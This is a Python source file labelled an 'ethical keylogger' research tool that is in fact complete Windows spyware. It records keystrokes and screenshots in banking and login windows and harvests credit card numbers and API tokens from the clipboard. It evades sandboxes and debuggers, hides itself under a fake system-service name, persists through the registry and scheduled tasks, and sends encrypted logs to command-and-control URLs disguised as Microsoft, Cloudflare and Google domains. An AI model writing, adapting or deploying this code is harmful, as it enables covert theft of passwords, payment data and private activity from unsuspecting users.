#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Enhanced Ethical Keylogger — Research & Defense Simulation Tool
⚠️ For authorized use only. Violation of laws is your responsibility.
"""

import os
import sys
import time
import threading
import logging
import json
import base64
import hashlib
import secrets
import re
import ctypes
import psutil
import platform
import subprocess
import shutil
import socket
import requests
from datetime import datetime, timedelta
from pathlib import Path
from typing import Optional, Dict, Any, List
from contextlib import suppress

# Optional imports (fail gracefully)
try:
    from pynput import keyboard
    from PIL import ImageGrab
    import pyperclip
    import winreg
    import win32gui
    import win32con
    import win32process
    import win32api
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.hkdf import HKDF
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
except ImportError as e:
    print(f"[!] Critical module missing: {e}. Install requirements.")
    sys.exit(1)

# ─────────────────────────────────────────────────────────────────────────────
# 🔒 CONFIGURATION (dynamically derived at runtime for stealth)
# ─────────────────────────────────────────────────────────────────────────────

class Config:
    def __init__(self):
        self.id = self._gen_id()
        self.work_dir = Path(os.getenv("APPDATA")) / "SysHealthSvc"
        self.log_path = self.work_dir / "sys_health.log"
        self.screenshot_dir = self.work_dir / "assets"
        self.buffer_interval = 30  # seconds
        self.screenshot_interval = 120  # seconds (longer for stealth)
        self.exfil_interval = 600  # 10 minutes
        self.jitter = 0.3  # ±30% timing jitter
        self.c2_urls = [
            "https://update.microsoft-edge.net/healthcheck",
            "https://cdn.cloudflare.com/edge/config",
            "https://fonts.googleapis.com/css2",
        ]
        self.kill_switch_domains = ["killswitch.example.com"]  # e.g., resolve to 127.0.0.1 on C2
        self.master_key = self._derive_master_key()
        self.running = True
        self.setup_dirs()

    def _gen_id(self) -> str:
        """Hardware-fingerprinted unique ID (non-PII)"""
        try:
            import uuid
            mac = uuid.getnode()
            return hashlib.sha256(f"{mac}{platform.node()}{platform.processor()}".encode()).hexdigest()[:16]
        except:
            return secrets.token_hex(8)

    def _derive_master_key(self) -> bytes:
        """Derive encryption key from system entropy (not hardcoded!)"""
        try:
            entropy = (
                f"{os.urandom(16)}"
                f"{platform.node()}"
                f"{platform.processor()}"
                f"{win32api.GetVolumeInformation('C:\\')[1]}"  # Volume serial
            ).encode()
            hkdf = HKDF(
                algorithm=hashes.SHA256(),
                length=32,
                salt=b"SysHealth",
                info=b"master",
            )
            return hkdf.derive(entropy)
        except Exception as e:
            logging.error(f"[KDF] Failed, using fallback: {e}")
            return secrets.token_bytes(32)

    def setup_dirs(self):
        self.work_dir.mkdir(parents=True, exist_ok=True)
        self.screenshot_dir.mkdir(exist_ok=True)
        # Hide directories
        try:
            ctypes.windll.kernel32.SetFileAttributesW(str(self.work_dir), 2)  # FILE_ATTRIBUTE_HIDDEN
        except:
            pass

CONFIG = Config()

# ─────────────────────────────────────────────────────────────────────────────
# 📝 STEALTH LOGGING (obfuscated, rotating, chaff-inserted)
# ─────────────────────────────────────────────────────────────────────────────

class StealthLogger:
    _instance = None

    def __new__(cls):
        if cls._instance is None:
            cls._instance = super().__new__(cls)
            cls._instance._setup()
        return cls._instance

    def _setup(self):
        self.logger = logging.getLogger("stealth")
        self.logger.setLevel(logging.INFO)
        handler = logging.FileHandler(CONFIG.log_path, encoding="utf-8")
        handler.setFormatter(logging.Formatter("%(asctime)s|%(message)s", datefmt="%Y-%m-%d %H:%M:%S"))
        self.logger.addHandler(handler)
        self.last_chaff = time.time()

    def log(self, msg: str, sensitive: bool = False):
        if not msg.strip():
            return
        if sensitive:
            msg = f"[SENS]{base64.b64encode(msg.encode()).decode()}"
        else:
            # Insert chaff ~1% of time
            if time.time() - self.last_chaff > 600 and secrets.randbelow(100) < 1:
                chaff = secrets.choice([
                    "INFO: Memory check OK",
                    "DEBUG: Service heartbeat",
                    "TRACE: Cache refreshed"
                ])
                self.logger.info(chaff)
                self.last_chaff = time.time()
        self.logger.info(msg)

    @staticmethod
    def rotate_logs():
        """Keep only last 7 days of logs"""
        try:
            cutoff = datetime.now() - timedelta(days=7)
            with open(CONFIG.log_path, "r+", encoding="utf-8") as f:
                lines = f.readlines()
                kept = [line for line in lines if datetime.fromisoformat(line.split("|")[0]) > cutoff]
                f.seek(0)
                f.writelines(kept)
                f.truncate()
        except Exception as e:
            logging.error(f"[ROTATE] {e}")

# ─────────────────────────────────────────────────────────────────────────────
# 🛡️ EVASION & ANTI-ANALYSIS
# ─────────────────────────────────────────────────────────────────────────────

class Evasion:
    SUSPICIOUS_PROCESSES = {
        "procmon.exe", "wireshark.exe", "idaq64.exe", "x64dbg.exe",
        "ollydbg.exe", "httpdebugger.exe", "fiddler.exe", "cheatengine"
    }
    SUSPICIOUS_WINDOWS = {
        "Process Hacker", "Wireshark", "IDA", "x64dbg", "Spy++"
    }

    @staticmethod
    def is_sandboxed() -> bool:
        # Check VM artifacts
        if "VBOX" in platform.uname().version.upper() or "VMWARE" in platform.uname().version.upper():
            return True
        # Low CPU/core count
        if psutil.cpu_count() < 2 or psutil.virtual_memory().total < 2 * 1024**3:
            return True
        # No mouse movement in 30 sec
        try:
            class POINT(ctypes.Structure):
                _fields_ = [("x", ctypes.c_long), ("y", ctypes.c_long)]
            pt = POINT()
            ctypes.windll.user32.GetCursorPos(ctypes.byref(pt))
            time.sleep(0.1)
            pt2 = POINT()
            ctypes.windll.user32.GetCursorPos(ctypes.byref(pt2))
            if pt.x == pt2.x and pt.y == pt2.y:
                return True
        except:
            pass
        return False

    @staticmethod
    def check_analysis_tools():
        for proc in psutil.process_iter(["name"]):
            if proc.info["name"].lower() in Evasion.SUSPICIOUS_PROCESSES:
                raise SystemExit("Analysis environment detected.")
        # Window title scanning
        def enum_windows(hwnd, _):
            if win32gui.IsWindowVisible(hwnd):
                title = win32gui.GetWindowText(hwnd).lower()
                for s in Evasion.SUSPICIOUS_WINDOWS:
                    if s.lower() in title:
                        raise SystemExit("Debugger window detected.")
        win32gui.EnumWindows(enum_windows, None)

    @staticmethod
    def kill_switch_check():
        for domain in CONFIG.kill_switch_domains:
            try:
                ips = socket.getaddrinfo(domain, None)
                if any(ip[4][0] == "127.0.0.1" for ip in ips):
                    raise SystemExit("Kill switch activated.")
            except:
                continue

# ─────────────────────────────────────────────────────────────────────────────
# 📸 CAPTURE MODULES
# ─────────────────────────────────────────────────────────────────────────────

class Capture:
    TARGET_WINDOW_KEYWORDS = {"login", "password", "bank", "paypal", "amazon", "email", "account", "auth"}
    SENSITIVE_PATTERNS = [
        (r"\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b", "EMAIL"),
        (r"\b(?:\d[ -]*?){13,16}\b", "CC"),
        (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", "DISCORD_TOKEN"),
        (r"sk_live_[a-zA-Z0-9]{24}", "STRIPE_KEY"),
        (r"ghp_[a-zA-Z0-9]{36}", "GITHUB_TOKEN"),
    ]

    @staticmethod
    def get_active_window_info() -> Dict[str, Any]:
        try:
            hwnd = win32gui.GetForegroundWindow()
            pid = win32process.GetWindowThreadProcessId(hwnd)[1]
            title = win32gui.GetWindowText(hwnd)
            exe = psutil.Process(pid).name() if pid else "unknown"
            return {"hwnd": hwnd, "title": title, "exe": exe}
        except:
            return {"hwnd": 0, "title": "", "exe": "unknown"}

    @staticmethod
    def should_capture(window_info: Dict[str, Any]) -> bool:
        title = window_info["title"].lower()
        exe = window_info["exe"].lower()
        return any(kw in title or kw in exe for kw in Capture.TARGET_WINDOW_KEYWORDS)

    @staticmethod
    def take_screenshot():
        if not Capture.should_capture(Capture.get_active_window_info()):
            return
        try:
            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            fname = CONFIG.screenshot_dir / f"img_{ts}.jpg"
            img = ImageGrab.grab()
            # Compress aggressively
            img.save(fname, "JPEG", quality=40, optimize=True)
            StealthLogger().log(f"SCR:{fname.name}")
        except Exception as e:
            StealthLogger().log(f"[ERR] SCR: {e}")

    @staticmethod
    def monitor_clipboard():
        last = ""
        while CONFIG.running:
            try:
                current = pyperclip.paste()
                if current != last and current.strip():
                    for pattern, label in Capture.SENSITIVE_PATTERNS:
                        if re.search(pattern, current, re.IGNORECASE):
                            StealthLogger().log(f"CLIP:{label}:{current[:100]}", sensitive=True)
                            break
                    last = current
            except:
                pass
            time.sleep(5)

# ─────────────────────────────────────────────────────────────────────────────
# 🔐 ENCRYPTION & EXFILTRATION
# ─────────────────────────────────────────────────────────────────────────────

class Exfiltration:
    @staticmethod
    def encrypt(data: bytes) -> str:
        """AES-GCM authenticated encryption"""
        aesgcm = AESGCM(CONFIG.master_key)
        nonce = secrets.token_bytes(12)
        ciphertext = aesgcm.encrypt(nonce, data, None)
        return base64.b64encode(nonce + ciphertext).decode()

    @staticmethod
    def beacon():
        while CONFIG.running:
            try:
                # Add jitter
                jitter = secrets.randbelow(int(CONFIG.exfil_interval * CONFIG.jitter))
                time.sleep(CONFIG.exfil_interval + jitter)

                # Rotate logs first
                StealthLogger.rotate_logs()

                # Read + encrypt logs
                if not CONFIG.log_path.exists():
                    continue
                with open(CONFIG.log_path, "rb") as f:
                    payload_raw = f.read()
                if not payload_raw:
                    continue

                encrypted = Exfiltration.encrypt(payload_raw)
                beacon_data = {
                    "id": CONFIG.id,
                    "ts": int(time.time()),
                    "data": encrypted,
                    "ver": "2.1"
                }

                # Try URLs in order
                for url in CONFIG.c2_urls:
                    try:
                        resp = requests.post(
                            url,
                            json=beacon_data,
                            headers={
                                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                                "Content-Type": "application/json"
                            },
                            timeout=15,
                            verify=True  # Ensure TLS
                        )
                        if resp.status_code == 200:
                            # Check for kill-switch command
                            cmd = resp.json().get("cmd")
                            if cmd == "self-destruct":
                                StealthLogger().log("[!] Remote kill received.")
                                CONFIG.running = False
                                os.remove(sys.executable)
                                sys.exit(0)
                            elif cmd == "clear-logs":
                                CONFIG.log_path.write_bytes(b"")
                            break
                    except Exception as e:
                        StealthLogger().log(f"[NET] {url} failed: {e}")
            except Exception as e:
                StealthLogger().log(f"[BEACON] {e}")

# ─────────────────────────────────────────────────────────────────────────────
# 🔌 PERSISTENCE
# ─────────────────────────────────────────────────────────────────────────────

class Persistence:
    @staticmethod
    def registry_run():
        try:
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0,
                winreg.KEY_WRITE
            )
            winreg.SetValueEx(key, "SysHealthMonitor", 0, winreg.REG_SZ, sys.executable)
            winreg.CloseKey(key)
            StealthLogger().log("PERSIST: Registry HKCU\\Run set")
        except Exception as e:
            StealthLogger().log(f"[REG] {e}")

    @staticmethod
    def scheduled_task():
        name = "SysHealthMonitor"
        try:
            subprocess.run([
                "schtasks", "/create", "/tn", name,
                "/tr", sys.executable,
                "/sc", "onlogon", "/rl", "highest", "/f"
            ], check=True, capture_output=True)
            StealthLogger().log("PERSIST: Scheduled task created")
        except Exception as e:
            StealthLogger().log(f"[TASK] {e}")

    @staticmethod
    def uac_bypass():
        # Simple DLL hijack attempt (e.g., for fodhelper)
        try:
            src = sys.executable
            dst = os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\WindowsApps\wsl.exe.local\wsl.exe")
            os.makedirs(os.path.dirname(dst), exist_ok=True)
            shutil.copy2(src, dst)
            StealthLogger().log("PERSIST: UAC bypass (WSL stub)")
        except:
            pass

# ─────────────────────────────────────────────────────────────────────────────
# ⌨️ KEYLOGGER CORE
# ─────────────────────────────────────────────────────────────────────────────

class KeyHandler:
    SPECIAL_KEYS = {
        keyboard.Key.space: " ",
        keyboard.Key.enter: "[ENT]",
        keyboard.Key.tab: "[TAB]",
        keyboard.Key.backspace: "[BSP]",
        keyboard.Key.shift: "[SHIFT]",
        keyboard.Key.ctrl_l: "[CTRL]",
        keyboard.Key.alt_l: "[ALT]",
        keyboard.Key.caps_lock: "[CAPS]",
        keyboard.Key.esc: "[ESC]",
    }

    def __init__(self):
        self.buffer = []
        self.last_flush = time.time()

    def flush(self):
        if self.buffer:
            msg = "".join(self.buffer)
            StealthLogger().log(f"KEY:{msg}", sensitive=True)
            self.buffer = []

    def on_press(self, key):
        if not CONFIG.running:
            return False

        win_info = Capture.get_active_window_info()
        if not Capture.should_capture(win_info):
            return

        try:
            if hasattr(key, 'char') and key.char:
                self.buffer.append(key.char)
            elif key in KeyHandler.SPECIAL_KEYS:
                self.buffer.append(KeyHandler.SPECIAL_KEYS[key])
        except Exception as e:
            StealthLogger().log(f"[KEY] {e}")

        # Auto-flush
        if time.time() - self.last_flush > CONFIG.buffer_interval:
            self.flush()
            self.last_flush = time.time()

    def on_release(self, key):
        if key == keyboard.Key.f12:  # Hidden kill key (not ESC for stealth)
            StealthLogger().log("Manual termination via F12")
            CONFIG.running = False
            return False

# ─────────────────────────────────────────────────────────────────────────────
# 🧠 MAIN EXECUTION
# ─────────────────────────────────────────────────────────────────────────────

def hide_console():
    """Hide console window on Windows"""
    ctypes.windll.kernel32.SetConsoleTitleW("System Health Service")
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def watchdog():
    """Watchdog to prevent hangs"""
    start = time.time()
    while CONFIG.running:
        if time.time() - start > 3600:  # Restart hourly
            os.execv(sys.executable, sys.argv)
        time.sleep(60)

def main():
    # Early evasion
    if Evasion.is_sandboxed():
        time.sleep(600)  # Sleep to evade time-based sandbox
        sys.exit(0)
    Evasion.check_analysis_tools()
    Evasion.kill_switch_check()

    # Setup
    hide_console()
    StealthLogger()
    Persistence.registry_run()
    Persistence.scheduled_task()
    # Persistence.uac_bypass()  # Uncomment only if high-priv needed

    # Workers
    threading.Thread(target=watchdog, daemon=True).start()
    threading.Thread(target=Exfiltration.beacon, daemon=True).start()
    threading.Thread(target=Capture.monitor_clipboard, daemon=True).start()

    # Screenshot worker
    def screenshot_loop():
        while CONFIG.running:
            time.sleep(CONFIG.screenshot_interval + secrets.randbelow(30))
            if CONFIG.running:
                Capture.take_screenshot()
    threading.Thread(target=screenshot_loop, daemon=True).start()

    # Keylogger
    handler = KeyHandler()
    with keyboard.Listener(on_press=handler.on_press, on_release=handler.on_release) as listener:
        listener.join()

    # Cleanup
    handler.flush()
    StealthLogger().log("Service stopped.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        pass
    except Exception as e:
        StealthLogger().log(f"[FATAL] {e}")